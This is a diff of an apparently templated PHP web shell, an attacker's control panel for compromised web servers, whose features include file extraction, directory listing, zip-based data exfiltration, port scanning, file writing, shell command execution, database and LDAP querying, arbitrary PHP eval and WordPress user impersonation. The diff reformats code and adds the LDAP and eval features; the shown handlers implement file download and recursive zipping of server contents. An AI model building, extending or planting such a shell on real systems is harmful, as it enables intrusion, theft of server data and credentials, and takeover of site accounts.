@@ -16,21 +16,23 @@ error_reporting(0);
 session_start();
 
 // Features name constants
-$LOGIN = "__FEAT_LOGIN__";
-$FILE_EXTRACTION = "__FEAT_FILE_EXTRACTION__";
+$LOGIN                   = "__FEAT_LOGIN__";
+$FILE_EXTRACTION         = "__FEAT_FILE_EXTRACTION__";
 $FILE_EXTRACTION_PREVIEW = "__FEAT_FILE_EXTRACTION_PREVIEW__";
-$DIRECTORY_LISTING = "__FEAT_DIRECTORY_LISTING__";
-$EXFILTRATE = "__FEAT_EXFILTRATE__";
-$PORT_SCAN = "__FEAT_PORT_SCAN__";
-$WRITE_FILE = "__FEAT_WRITE_FILE__";
-$RUN_COMMAND = "__FEAT_RUN_COMMAND__";
-$PHP_INFO = "__FEAT_PHP_INFO__";
-$QUERY_DATABASES = "__FEAT_QUERY_DATABASES__";
-$IMPERSONATE_WP_USER = "__FEAT_IMPERSONATE_WP_USER__";
+$DIRECTORY_LISTING       = "__FEAT_DIRECTORY_LISTING__";
+$EXFILTRATE              = "__FEAT_EXFILTRATE__";
+$PORT_SCAN               = "__FEAT_PORT_SCAN__";
+$WRITE_FILE              = "__FEAT_WRITE_FILE__";
+$RUN_COMMAND             = "__FEAT_RUN_COMMAND__";
+$PHP_INFO                = "__FEAT_PHP_INFO__";
+$QUERY_DATABASES         = "__FEAT_QUERY_DATABASES__";
+$QUERY_LDAP              = "__FEAT_QUERY_LDAP__";
+$EVAL                    = "__FEAT_EVAL__";
+$IMPERSONATE_WP_USER     = "__FEAT_IMPERSONATE_WP_USER__";
 
 $USERNAME = "__USERNAME__";
 $PASSWORD = "__PASSWORD__";
-$SALT = "__SALT__";
+$SALT     = "__SALT__";
 
 /**
  * Define the enabled features
@@ -38,68 +40,82 @@ $SALT = "__SALT__";
  * @var array<string, array{title: string, description: string, svg: string, hidden?: bool}> $ENABLED_FEATURES
  */
 $ENABLED_FEATURES = array(
-    $FILE_EXTRACTION => array(
-        "title" => "File extraction",
+    $FILE_EXTRACTION         => array(
+        "title"       => "File extraction",
         "description" => "Extract file content as base64.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
 </svg>',
     ),
     $FILE_EXTRACTION_PREVIEW => array(
-        "title" => "File extraction",
+        "title"       => "File extraction",
         "description" => "Extract file content as base64.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
 </svg>',
-        "hidden" => true,
+        "hidden"      => true,
     ),
-    $DIRECTORY_LISTING => array(
-        "title" => "Directory listing",
+    $DIRECTORY_LISTING       => array(
+        "title"       => "Directory listing",
         "description" => "List all files and folders in a directory and optionally its subdirectories.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 12h16.5m-16.5 3.75h16.5M3.75 19.5h16.5M5.625 4.5h12.75a1.875 1.875 0 0 1 0 3.75H5.625a1.875 1.875 0 0 1 0-3.75Z" />
 </svg>',
     ),
-    $EXFILTRATE => array(
-        "title" => "Exfiltrate",
+    $EXFILTRATE              => array(
+        "title"       => "Exfiltrate",
         "description" => "Exfiltrate data from the server in a password protected zip archive.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5M16.5 12 12 16.5m0 0L7.5 12m4.5 4.5V3" />
 </svg>',
     ),
-    $PORT_SCAN => array(
-        "title" => "Port scan",
+    $PORT_SCAN               => array(
+        "title"       => "Port scan",
         "description" => "Scan a given range of TCP ports using connect method.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
-  <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m0-10.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.75c0 5.592 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.57-.598-3.75h-.152c-3.196 0-6.1-1.25-8.25-3.286Zm0 13.036h.008v.008H12v-.008Z" />
 </svg>',
     ),
-    $WRITE_FILE => array(
-        "title" => "Write file",
+    $WRITE_FILE              => array(
+        "title"       => "Write file",
         "description" => "Write a file to the given path, writing permission are required.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
 </svg>',
     ),
-    $RUN_COMMAND => array(
-        "title" => "Run command",
+    $RUN_COMMAND             => array(
+        "title"       => "Run command",
         "description" => "Run a system command using the default shell.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="m6.75 7.5 3 2.25-3 2.25m4.5 0h3m-9 8.25h13.5A2.25 2.25 0 0 0 21 18V6a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 6v12a2.25 2.25 0 0 0 2.25 2.25Z" />
 </svg>',
     ),
-    $PHP_INFO => array(
-        "title" => "PHP Info",
+    $PHP_INFO                => array(
+        "title"       => "PHP Info",
         "description" => "Display PHP information.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z" />
 </svg>',
     ),
-    $QUERY_DATABASES => array(
-        "title" => "Query databases",
+    $QUERY_DATABASES         => array(
+        "title"       => "Query databases",
         "description" => "Query databases using the provided credentials.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125" />
+</svg>',
+    ),
+    $QUERY_LDAP              => array(
+        "title"       => "Query LDAP",
+        "description" => "Query LDAP using the provided credentials.",
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 21h16.5M4.5 3h15M5.25 3v18m13.5-18v18M9 6.75h1.5m-1.5 3h1.5m-1.5 3h1.5m3-6H15m-1.5 3H15m-1.5 3H15M9 21v-3.375c0-.621.504-1.125 1.125-1.125h3.75c.621 0 1.125.504 1.125 1.125V21" />
+</svg>',
+    ),
+    $EVAL                    => array(
+        "title"       => "Eval PHP",
+        "description" => "Evaluate PHP code.",
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
 </svg>',
     ),
 );
@@ -107,9 +123,9 @@ $ENABLED_FEATURES = array(
 // Enable WordPress specific features
 if (defined("__WP__") && __WP__) {
     $ENABLED_FEATURES[$IMPERSONATE_WP_USER] = array(
-        "title" => "Impersonate WP user",
+        "title"       => "Impersonate WP user",
         "description" => "Impersonate a WordPress user by changing the current session.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
 </svg>',
     );
@@ -123,14 +139,16 @@ $CSS = '__CSS__';
 /// UTILITY FUNCTIONS //
 ////////////////////////
 
-// Fix for PHP < 5.5
-if (!function_exists("array_column")) {
-    function array_column($array, $column_name)
-    {
-        return array_map(function ($element) use ($column_name) {
-            return $element[$column_name];
-        }, $array);
-    }
+/**
+ * Array column function for PHP < 5.5
+ *
+ * @param $array array Array to extract the column from
+ * @param $column_name string Column name to extract
+ *
+ * @return array Extracted column
+ */
+function _array_column($array, $column_name) {
+    return array_map(function ($element) use ($column_name) { return $element[$column_name]; }, $array);
 }
 
 /**
@@ -138,8 +156,7 @@ if (!function_exists("array_column")) {
  *
  * @return bool
  */
-function isPost()
-{
+function isPost() {
     return $_SERVER['REQUEST_METHOD'] === 'POST';
 }
 
@@ -150,8 +167,7 @@ function isPost()
  *
  * @return bool
  */
-function isCheckboxActive($name)
-{
+function isCheckboxActive($name) {
     return isset($_POST[$name]) && $_POST[$name] === "y";
 }
 
@@ -167,8 +183,7 @@ function isCheckboxActive($name)
  *
  * @return string
  */
-function htmlHighlightActivePage($current_page, $checking_page)
-{
+function htmlHighlightActivePage($current_page, $checking_page) {
     if ($current_page === $checking_page) {
         return "bg-zinc-800 text-white";
     }
@@ -184,8 +199,7 @@ function htmlHighlightActivePage($current_page, $checking_page)
  *
  * @return string
  */
-function makeNavLink($page, $current_page, $definition)
-{
+function makeNavLink($page, $current_page, $definition) {
     if ($definition["hidden"]) {
         return "";
     }
@@ -217,8 +231,7 @@ function makeNavLink($page, $current_page, $definition)
  *
  * @return string
  */
-function makePageHeader($title, $description)
-{
+function makePageHeader($title, $description) {
     ob_start();
     ?>
     <div class="lg:flex lg:items-center lg:justify-between">
@@ -255,8 +268,16 @@ function makePageHeader($title, $description)
  *
  * @return string
  */
-function makeInput($type, $label, $name, $placeholder, $description, $required = false, $query_param = null, $value = null)
-{
+function makeInput(
+    $type,
+    $label,
+    $name,
+    $placeholder,
+    $description,
+    $required = false,
+    $query_param = null,
+    $value = null
+) {
     ob_start();
     if ($type !== "textarea") {
         ?>
@@ -291,7 +312,8 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
             </p>
         </div>
         <?php
-    } else {
+    }
+    else {
         ?>
         <div class="flex flex-col gap-y-2" id="<?php echo $name ?>-container">
             <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
@@ -337,8 +359,7 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
  *
  * @return string
  */
-function makeSelect($label, $name, $options, $required = false, $disable_reason = null)
-{
+function makeSelect($label, $name, $options, $required = false, $disable_reason = null) {
     ob_start();
     ?>
     <div id="<?php echo $name ?>-container">
@@ -362,14 +383,14 @@ function makeSelect($label, $name, $options, $required = false, $disable_reason 
             <?php
             foreach ($options as $option) {
                 echo "<option value='" .
-                    $option["value"] .
-                    "' " .
-                    ($option["disabled"] ? "disabled" : "") .
-                    ($option["selected"] ? "selected" : "") .
-                    ">" .
-                    $option["label"] .
-                    ($option["disabled"] && !is_null($disable_reason) ? " - $disable_reason" : "") .
-                    "</option>";
+                     $option["value"] .
+                     "' " .
+                     ($option["disabled"] ? "disabled" : "") .
+                     ($option["selected"] ? "selected" : "") .
+                     ">" .
+                     $option["label"] .
+                     ($option["disabled"] && !is_null($disable_reason) ? " - $disable_reason" : "") .
+                     "</option>";
             }
             ?>
         </select>
@@ -386,12 +407,11 @@ function makeSelect($label, $name, $options, $required = false, $disable_reason 
  * @param $description string Description of the checkbox
  * @param $is_checked bool Whether the checkbox is checked
  * @param $value string Value of the checkbox, default is "y"
- * @param $onclick string OnClick event for the checkbox
+ * @param $onclick string|null OnClick event for the checkbox
  *
  * @return string
  */
-function makeCheckbox($name, $label, $description, $is_checked = false, $value = "y", $onclick = null)
-{
+function makeCheckbox($name, $label, $description, $is_checked = false, $value = "y", $onclick = null) {
     ob_start();
     ?>
     <div class="relative flex items-start" id="<?php echo $name ?>-container">
@@ -432,8 +452,14 @@ function makeCheckbox($name, $label, $description, $is_checked = false, $value =
  *
  * @return string
  */
-function makeForm($operation, $action, $elements, $method = "post", $submit_label = "Run operation", $classes = "flex flex-col gap-y-6 max-w-xl mt-8")
-{
+function makeForm(
+    $operation,
+    $action,
+    $elements,
+    $method = "post",
+    $submit_label = "Run operation",
+    $classes = "flex flex-col gap-y-6 max-w-xl mt-8"
+) {
     ob_start();
     ?>
     <form action="<?php echo $action ?>" method="<?php echo $method ?>"
@@ -462,8 +488,7 @@ function makeForm($operation, $action, $elements, $method = "post", $submit_labe
  *
  * @return string
  */
-function makePage($elements, $current_page)
-{
+function makePage($elements, $current_page) {
     global $ENABLED_FEATURES, $CSS, $LOGIN;
     if ($_SESSION["auth"] !== true) {
         header("Location: ?page=" . $LOGIN);
@@ -520,8 +545,7 @@ function makePage($elements, $current_page)
  *
  * @return string
  */
-function makeLoginPage()
-{
+function makeLoginPage() {
     global $CSS, $LOGIN;
     ob_start();
     ?>
@@ -593,12 +617,11 @@ function makeLoginPage()
 /**
  * Create a code highlight element
  *
- * @param $code string|int|float Code to highlight
+ * @param $code float|int|string Code to highlight
  *
  * @return string
  */
-function makeCodeHighlight($code)
-{
+function makeCodeHighlight($code) {
     ob_start();
     ?>
     <code class="font-mono bg-zinc-100 text-zinc-900 text-sm px-2 py-1 rounded mx-1 select-all"><?php echo $code ?></code>
@@ -614,8 +637,7 @@ function makeCodeHighlight($code)
  *
  * @return string
  */
-function makeAlert($title, $message)
-{
+function makeAlert($title, $message) {
     ob_start();
     ?>
     <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 rounded mt-4 text-zinc-900 flex gap-x-4">
@@ -649,8 +671,7 @@ function makeAlert($title, $message)
  *
  * @return string
  */
-function makeTable($title, $description, $rows, $columns = null)
-{
+function makeTable($title, $description, $rows, $columns = null, $action_form = null) {
     $columns = $columns ?: array_keys($rows[0]);
     ob_start();
     ?>
@@ -661,10 +682,11 @@ function makeTable($title, $description, $rows, $columns = null)
                 <p class="mt-2 text-sm text-gray-700"><?php echo $description; ?></p>
             </div>
             <div class="mt-4 sm:ml-16 sm:mt-0 sm:flex-none">
-                <button type="button"
-                        class="block rounded-md bg-indigo-600 px-3 py-2 text-center text-sm font-semibold text-white shadow-sm hover:bg-indigo-500 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-600">
-                    Add user
-                </button>
+                <?php
+                if ($action_form !== null) {
+                    echo $action_form;
+                }
+                ?>
             </div>
         </div>
         <div class="mt-8 flow-root">
@@ -682,23 +704,22 @@ function makeTable($title, $description, $rows, $columns = null)
                             </tr>
                             </thead>
                             <tbody class="divide-y divide-gray-200 bg-white">
-                            <tr>
-                                <?php
-                                foreach ($rows as $row) {
-                                    foreach ($columns as $key => $column) {
-                                        if (is_array($row[$key])) {
-                                            echo "<td class='whitespace-nowrap px-3 py-4 text-sm text-gray-500'>" . implode(", ", $row[$key]) . "</td>";
-                                        } else {
-                                            echo "<td class='whitespace-nowrap px-3 py-4 text-sm text-gray-500'>$row[$key]</td>";
-                                        }
+                            <?php
+                            foreach ($rows as $row) {
+                                echo "<tr>";
+                                foreach ($columns as $key => $column) {
+                                    if (is_array($row[$key])) {
+                                        echo "<td class='whitespace-nowrap px-3 py-4 text-sm text-gray-500'>" .
+                                             implode(", ", $row[$key]) .
+                                             "</td>";
+                                    }
+                                    else {
+                                        echo "<td class='whitespace-nowrap px-3 py-4 text-sm text-gray-500'>$row[$key]</td>";
                                     }
                                 }
-                                ?>
-                            </tr>
-
-                            <!-- <td class="relative whitespace-nowrap py-4 pl-3 pr-4 text-right text-sm font-medium sm:pr-6">
-                                    <a href="#" class="text-indigo-600 hover:text-indigo-900">Edit<span class="sr-only">, Lindsay Walton</span></a>
-                                </td> -->
+                                echo "</tr>";
+                            }
+                            ?>
                             </tbody>
                         </table>
                     </div>
@@ -706,7 +727,6 @@ function makeTable($title, $description, $rows, $columns = null)
             </div>
         </div>
     </div>
-
     <?php
     return ob_get_clean();
 }
@@ -714,7 +734,10 @@ function makeTable($title, $description, $rows, $columns = null)
 /**
  * Open the command output screen where output can be freely written
  *
+ * @param string $classes Classes to apply to the command output screen
  * @param string $title Title of the command output screen
+ * @param bool $no_margin Whether to remove the margin from the command output screen
+ * @param bool $no_padding Whether to remove the padding from the command output screen
  *
  * @return void
  */
@@ -738,8 +761,7 @@ echo $no_padding ? "" : "py-10 ";
  *
  * @return void
  */
-function closeCommandOutputScreen()
-{
+function closeCommandOutputScreen() {
     ?></pre>
     </div>
     </div>
@@ -750,12 +772,11 @@ function closeCommandOutputScreen()
 /**
  * Output data to the command output screen
  *
- * @param string|array $data Data to output
+ * @param array|string $data Data to output
  *
  * @return void
  */
-function out($data)
-{
+function out($data) {
     if (is_array($data)) {
         $data = implode("\n", $data);
     }
@@ -772,12 +793,11 @@ function out($data)
  *
  * @param $filepath string Path to the file to download
  * @param $filesize int Size of the file
- * @param $filename string Name of the file to download or null to use the original filename
+ * @param $filename string|null Name of the file to download or null to use the original filename
  *
  * @return void
  */
-function chunkedDownload($filepath, $filesize, $filename = null)
-{
+function chunkedDownload($filepath, $filesize, $filename = null) {
     $chunk_size = 4096; // Adjust chunk size as needed
 
     header('Content-Description: File Transfer');
@@ -804,11 +824,10 @@ function chunkedDownload($filepath, $filesize, $filename = null)
  *
  * @return void
  */
-function handleFileExtraction()
-{
+function handleFileExtraction() {
     $filepath = $_POST['__PARAM_1__'];
-    $preview = strtolower($_POST['__PARAM_2__']) === "y";
-    $export = strtolower($_POST['__PARAM_3__']) === "y";
+    $preview  = strtolower($_POST['__PARAM_2__']) === "y";
+    $export   = strtolower($_POST['__PARAM_3__']) === "y";
 
     if (!file_exists($filepath)) {
         echo "Error: File '$filepath' does not exist.\n";
@@ -821,7 +840,7 @@ function handleFileExtraction()
     echo "File size: " . formatBytes($filesize) . "\n";
     if ($preview) {
         $preview_content = fopen($filepath, "r");
-        $read = fread($preview_content, 10240); // Read 10Kb
+        $read            = fread($preview_content, 10240); // Read 10Kb
         fclose($preview_content);
         echo "Preview:\n" . htmlspecialchars($read, ENT_QUOTES, "UTF-8") . "\n";
 
@@ -830,7 +849,8 @@ function handleFileExtraction()
 
     if ($filesize < 102400) { // Less than 100Kb
         chunkedDownload($filepath, $filesize);
-    } elseif ($export) {
+    }
+    elseif ($export) {
         chunkedDownload($filepath, $filesize);
     }
 }
@@ -840,9 +860,8 @@ function handleFileExtraction()
  *
  * @return void
  */
-function handleDirectoryListing()
-{
-    $path = $_POST['__PARAM_1__'];
+function handleDirectoryListing() {
+    $path      = $_POST['__PARAM_1__'];
     $max_depth = $_POST['__PARAM_2__'];
 
     listFilesRecursive($path, $max_depth);
@@ -858,8 +877,7 @@ function handleDirectoryListing()
  *
  * @return void
  */
-function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = true)
-{
+function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = true) {
     if (is_string($max_depth) && strtolower($max_depth) === "inf") {
         $max_depth = INF;
     }
@@ -883,7 +901,8 @@ function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = tr
                 // Recursively list files if depth is less than max depth
                 if ($depth < $max_depth) {
                     listFilesRecursive($sub_path, $max_depth, $depth + 1, false);
-                } else {
+                }
+                else {
                     // Print information for files beyond max depth
                     getStatForCurrentPath($sub_path);
                 }
@@ -901,23 +920,22 @@ function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = tr
  *
  * @return array
  */
-function getStatForCurrentPath($path)
-{
+function getStatForCurrentPath($path) {
     $stat = stat($path);
 
     // Print information for current path
     $perm = getPermissionsString($path);
     echo "$perm " .
-        pad_right("" . $stat["nlink"], 3) .
-        " " .
-        pad_right("" . $stat["uid"], 5) .
-        " " .
-        pad_right("" . $stat["gid"], 5) .
-        " " .
-        formatBytes($stat["size"]) .
-        " " .
-        convertUnixTimestampToDate($stat["mtime"]) .
-        " $path\n";
+         pad_right("" . $stat["nlink"], 3) .
+         " " .
+         pad_right("" . $stat["uid"], 5) .
+         " " .
+         pad_right("" . $stat["gid"], 5) .
+         " " .
+         formatBytes($stat["size"]) .
+         " " .
+         convertUnixTimestampToDate($stat["mtime"]) .
+         " $path\n";
 
     return array($stat, $perm);
 }
@@ -925,12 +943,11 @@ function getStatForCurrentPath($path)
 /**
  * Get the permissions string for a file or directory (unix like `ls -l` output)
  *
- * @param $path
+ * @param $path string Path to get permissions for
  *
  * @return string
  */
-function getPermissionsString($path)
-{
+function getPermissionsString($path) {
     if (!file_exists($path)) {
         return "----------";
     }
@@ -941,7 +958,8 @@ function getPermissionsString($path)
     $type = '';
     if (is_dir($path)) {
         $type = 'd';
-    } elseif (is_file($path)) {
+    }
+    elseif (is_file($path)) {
         $type = '-';
     }
 
@@ -966,13 +984,12 @@ function getPermissionsString($path)
 /**
  * Pad a string to the left with spaces
  *
- * @param $str
- * @param $pad_length
+ * @param $str string String to pad
+ * @param $pad_length int Length to pad to
  *
- * @return mixed|string
+ * @return string
  */
-function pad_right($str, $pad_length = 10)
-{
+function pad_right($str, $pad_length = 10) {
     // Ensure string and pad length are valid
     if (!is_string($str) || !is_int($pad_length) || $pad_length <= 0) {
         return $str; // Return unmodified string for invalid input
@@ -983,19 +1000,18 @@ function pad_right($str, $pad_length = 10)
 }
 
 /**
- * Format bytes to human readable format
+ * Format bytes to human-readable format
  *
- * @param $bytes
+ * @param $bytes array|int|float Bytes to format
  *
  * @return string
  */
-function formatBytes($bytes)
-{
+function formatBytes($bytes) {
     $units = array('B', 'KB', 'MB', 'GB', 'TB');
 
     $bytes = max($bytes, 0);
-    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
-    $pow = min($pow, count($units) - 1);
+    $pow   = floor(($bytes ? log($bytes) : 0) / log(1024));
+    $pow   = min($pow, count($units) - 1);
 
     // Calculate size in the chosen unit
     $bytes /= pow(1024, $pow);
@@ -1007,24 +1023,22 @@ function formatBytes($bytes)
 /**
  * Convert a Unix timestamp to a date string
  *
- * @param $timestamp
+ * @param $timestamp int Unix timestamp
  *
- * @return false|string
+ * @return string
  */
-function convertUnixTimestampToDate($timestamp)
-{
+function convertUnixTimestampToDate($timestamp) {
     return date('Y-m-d H:i:s', $timestamp);
 }
 
 /**
  * Get the shortest common path from a list of paths
  *
- * @param $paths
+ * @param $paths string[] List of paths
  *
  * @return string|null
  */
-function getShortestCommonPath($paths)
-{
+function getShortestCommonPath($paths) {
     if (empty($paths)) {
         return null;
     }
@@ -1032,15 +1046,16 @@ function getShortestCommonPath($paths)
     $shortest_path = $paths[0]; // Initialize with first path
 
     foreach ($paths as $path) {
-        $common_path = '';
-        $path_segments = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR)); // Split path by separator
+        $common_path       = '';
+        $path_segments     = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR)); // Split path by separator
         $shortest_segments = explode(DIRECTORY_SEPARATOR, trim($shortest_path, DIRECTORY_SEPARATOR));
 
         $min_length = min(count($path_segments), count($shortest_segments));
         for ($i = 0; $i < $min_length; $i++) {
             if ($path_segments[$i] === $shortest_segments[$i]) {
                 $common_path .= $path_segments[$i] . DIRECTORY_SEPARATOR;
-            } else {
+            }
+            else {
                 break;
             }
         }
@@ -1056,8 +1071,7 @@ function getShortestCommonPath($paths)
  *
  * @return void
  */
-function handleCreateZip()
-{
+function handleCreateZip() {
     $content = $_POST['__PARAM_1__'];
 
     if (!extension_loaded('zip')) {
@@ -1068,7 +1082,7 @@ function handleCreateZip()
         return;
     }
 
-    $zip = new ZipArchive();
+    $zip      = new ZipArchive();
     $zip_name = tempnam(sys_get_temp_dir(), "__RANDOM_5_STRING__");
 
     if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
@@ -1079,13 +1093,13 @@ function handleCreateZip()
         return;
     }
 
-    $lines = explode("\n", $content);
+    $lines            = explode("\n", $content);
     $path_replacement = getShortestCommonPath($lines);
     foreach ($lines as $line) {
         $parts = explode(',', trim($line)); // Split line by comma
-        $path = isset($parts[0]) ? $parts[0] : '';
+        $path  = isset($parts[0]) ? $parts[0] : '';
 
-        $recursive = in_array('with_tree', $parts);
+        $recursive  = in_array('with_tree', $parts);
         $extensions = array();
 
         foreach ($parts as $part) {
@@ -1112,7 +1126,8 @@ function handleCreateZip()
                         )  // Replace backslashes with forward slashes
                     ) // Remove common path from filename
                 );
-            } else {
+            }
+            else {
                 if (is_dir($path) && is_readable($path)) {
                     addDirectoryToZip($path, $zip, $recursive, $extensions, $path_replacement . DIRECTORY_SEPARATOR);
                 }
@@ -1138,8 +1153,7 @@ function handleCreateZip()
  *
  * @return void
  */
-function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = "")
-{
+function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = "") {
     $dir_handle = opendir($dir);
 
     while (($file = readdir($dir_handle)) !== false) {
@@ -1162,7 +1176,8 @@ function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = 
                         )  // Replace backslashes with forward slashes
                     ) // Remove common path from filename
                 ); // Add with relative path within zip
-            } else {
+            }
+            else {
                 if ($recursive && is_dir($sub_path) && is_readable($sub_path)) {
